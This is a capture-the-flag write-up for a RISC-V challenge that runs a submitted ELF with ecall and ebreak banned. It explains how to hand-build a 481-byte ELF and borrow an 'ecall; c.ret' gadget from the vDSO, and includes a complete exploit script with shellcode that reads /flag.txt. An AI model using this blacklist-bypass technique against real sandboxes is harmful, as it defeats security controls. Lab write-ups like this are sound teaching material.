# golfing

This challenge takes a base64-encoded RISC-V ELF, checks that it follows a very specific layout, and then runs it.

The goal is to read `/flag.txt`, but there are a few annoying restrictions:

- the ELF must be at most `481` bytes
- it has to be a valid RISC-V ELF
- it must have exactly two `PT_LOAD` segments
- `.text` has to start at file offset `0xb0`
- it needs a section table
- the submitted ELF cannot contain:
  - `ecall`
  - `ebreak`
  - `c.ebreak`
- `.text` cannot contain long runs of the same byte

The main problem is that reading the flag normally requires syscalls, but the ELF is not allowed to contain an `ecall` instruction.

## Idea

Instead of putting `ecall` in the ELF, I searched the vDSO for an existing `ecall; c.ret` sequence and called that.

The exploit does the following:

1. Builds a tiny ELF manually.
2. Gets the vDSO address from the auxiliary vector.
3. Scans the vDSO for `ecall; c.ret`.
4. Uses that gadget to call:
   - `openat`
   - `read`
   - `write`
   - `exit`

## ELF layout

The important constants are:

```python
BASE = 0x10000
TEXT_OFF = 0xb0
RW_BASE = BASE + 0x200000
PAGE = 0x1000
```

A 64-bit ELF header is `64` bytes, and each program header is `56` bytes.

```text
64 + 56 + 56 = 176 = 0xb0
```

That means `.text` can start immediately after the ELF header and the two required program headers.

The first `PT_LOAD` maps the ELF as read/execute at `0x10000`.

The second `PT_LOAD` creates a writable page at `0x210000`. Its file size is `0`, but its memory size is one page, so it gives the program a zeroed writable buffer without adding extra bytes to the file.

That page is used to store the flag after calling `read`.

## Saving space in the section table

The ELF needs three section headers:

- null section
- `.text`
- `.shstrtab`

The string table is:

```python
SHSTR = b'\x00.text\x00.shstrtab\x00'
```

It is exactly 17 bytes long.

Instead of storing it separately, I placed it inside unused bytes at the end of the null section header:

```python
elf[shoff + 47:shoff + 47 + len(SHSTR)] = SHSTR
```

Since a section header is 64 bytes:

```text
64 - 47 = 17
```

So the string table fits exactly.

## Finding the vDSO

At process startup, the stack contains:

```text
argc
argv
NULL
envp
NULL
auxv
```

The shellcode starts with:

```asm
ld a0, 0(sp)
slli a0, a0, 3
addi a1, sp, 8
add a1, a1, a0
ld a1, 24(a1)
```

This skips over `argc` and the `argv` entries.

In the challenge environment, the first auxiliary-vector entry contains `AT_SYSINFO_EHDR`, so loading from that location gives the vDSO base address.

## Finding an `ecall` gadget

The banned `ecall` bytes are:

```text
73 00 00 00
```

The vDSO contains syscall wrappers, so I scanned it for:

```asm
ecall
c.ret
```

The scanner is:

```asm
li a2, 0x73
li a3, 0x8082

scan:
    lw a4, 0(a1)
    bne a4, a2, next
    lhu a4, 4(a1)
    bne a4, a3, next
    mv s1, a1
    j found

next:
    addi a1, a1, 2
    j scan
```

`0x73` matches the `ecall` instruction, and `0x8082` matches `c.ret`.

Once found, the gadget address is saved in `s1`.

Every syscall is then made with:

```asm
jalr s1
```

The gadget runs `ecall`, then returns back to the shellcode.

## Reading the flag

First, open `/flag.txt`:

```asm
lla a1, path
li a0, -100
li a2, 0
li a3, 0
li a7, 56
jalr s1
```

This is:

```c
openat(AT_FDCWD, "/flag.txt", 0, 0);
```

Then read the flag into the writable page:

```asm
li a1, 0x210000
li a2, 0x7f
li a7, 63
jalr s1
```

Then write it to stdout:

```asm
mv a2, a0
li a0, 1
li a7, 64
jalr s1
```

Finally, exit:

```asm
li a0, 0
li a7, 93
jalr s1
```

## Exploit

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep
import base64
import os
import struct

exe = context.binary = ELF(
    os.path.join(os.path.dirname(__file__), 'chall'),
    checksec=False
)

gdbscript = '''
init-pwndbg
# init-gef-bata
file ./src/chall
c
'''


def start(argv=[]):
    if args.LOCAL:
        p = remote('127.0.0.1', 9002)
    elif args.RERUN:
        p = process(['./chall'] + argv, cwd='./src')
        sys.excepthook = rerun(p)
    elif args.REMOTE:
        host_port = [
            x for x in sys.argv[1:]
            if x not in ('LOCAL', 'REMOTE', 'GDB', 'RERUN')
        ]
        p = remote(host_port[0], int(host_port[1]))
    return p


p = start()

BASE = 0x10000
TEXT_OFF = 0xb0
RW_BASE = BASE + 0x200000
PAGE = 0x1000
EHDR_SIZE = 64
PHDR_SIZE = 56
SHDR_SIZE = 64
SHSTR = b'\x00.text\x00.shstrtab\x00'

text = asm(f'''
    .option rvc
    .option norelax

    ld a0, 0(sp)
    slli a0, a0, 3
    addi a1, sp, 8
    add a1, a1, a0
    ld a1, 24(a1)

    li a2, 0x73
    li a3, 0x8082

scan:
    lw a4, 0(a1)
    bne a4, a2, next
    lhu a4, 4(a1)
    bne a4, a3, next
    mv s1, a1
    j found

next:
    addi a1, a1, 2
    j scan

found:
    lla a1, path
    li a0, -100
    li a2, 0
    li a3, 0
    li a7, 56
    jalr s1

    li a1, {RW_BASE}
    li a2, 0x7f
    li a7, 63
    jalr s1

    mv a2, a0
    li a0, 1
    li a7, 64
    jalr s1

    li a0, 0
    li a7, 93
    jalr s1

path:
    .asciz "/flag.txt"
''', arch='riscv64', os='linux', bits=64, endian='little',
     vma=BASE + TEXT_OFF)

shoff = TEXT_OFF + len(text)
total = shoff + 3 * SHDR_SIZE
elf = bytearray(total)

elf[:EHDR_SIZE] = struct.pack(
    '<16sHHIQQQIHHHHHH',
    b'\x7fELF' + bytes([2, 1, 1]) + b'\x00' * 9,
    2, 243, 1, BASE + TEXT_OFF, EHDR_SIZE, shoff, 0,
    EHDR_SIZE, PHDR_SIZE, 2, SHDR_SIZE, 3, 2,
)

elf[EHDR_SIZE:EHDR_SIZE + PHDR_SIZE] = struct.pack(
    '<IIQQQQQQ',
    1, 5, 0, BASE, BASE, total, PAGE, PAGE
)

elf[
    EHDR_SIZE + PHDR_SIZE:
    EHDR_SIZE + 2 * PHDR_SIZE
] = struct.pack(
    '<IIQQQQQQ',
    1, 6, 0, RW_BASE, RW_BASE, 0, PAGE, PAGE
)

elf[TEXT_OFF:TEXT_OFF + len(text)] = text

elf[shoff + 47:shoff + 47 + len(SHSTR)] = SHSTR

elf[
    shoff + SHDR_SIZE:
    shoff + 2 * SHDR_SIZE
] = struct.pack(
    '<IIQQQQIIQQ',
    1, 1, 6, BASE + TEXT_OFF, TEXT_OFF,
    len(text), 0, 0, 4, 0
)

elf[
    shoff + 2 * SHDR_SIZE:
    shoff + 3 * SHDR_SIZE
] = struct.pack(
    '<IIQQQQIIQQ',
    7, 3, 0, 0, shoff + 47,
    len(SHSTR), 0, 0, 1, 0
)

assert len(elf) <= 481
assert elf[18:20] == struct.pack('<H', 243)
assert elf[shoff + 47:shoff + 64] == SHSTR

assert b'\x73\x00\x00\x00' not in elf
assert b'\x73\x00\x10\x00' not in elf
assert b'\x02\x90' not in elf

run = 1
for a, b in zip(text, text[1:]):
    run = run + 1 if a == b else 1
    assert run <= 3

payload = base64.b64encode(bytes(elf))

p.sendlineafter(b'base64): ', payload)
print(p.recvall(timeout=3).decode(errors='ignore'), end='')

interactive(flag=False)
```

## Summary

The solve was mainly about fitting everything into the ELF size limit and getting around the syscall instruction blacklist.

The important tricks were:

- manually building the ELF
- using a zero-file-size writable segment as a buffer
- overlapping `.shstrtab` with the null section header
- getting the vDSO address from auxv
- calling an `ecall; c.ret` gadget from the vDSO instead of including `ecall` in the ELF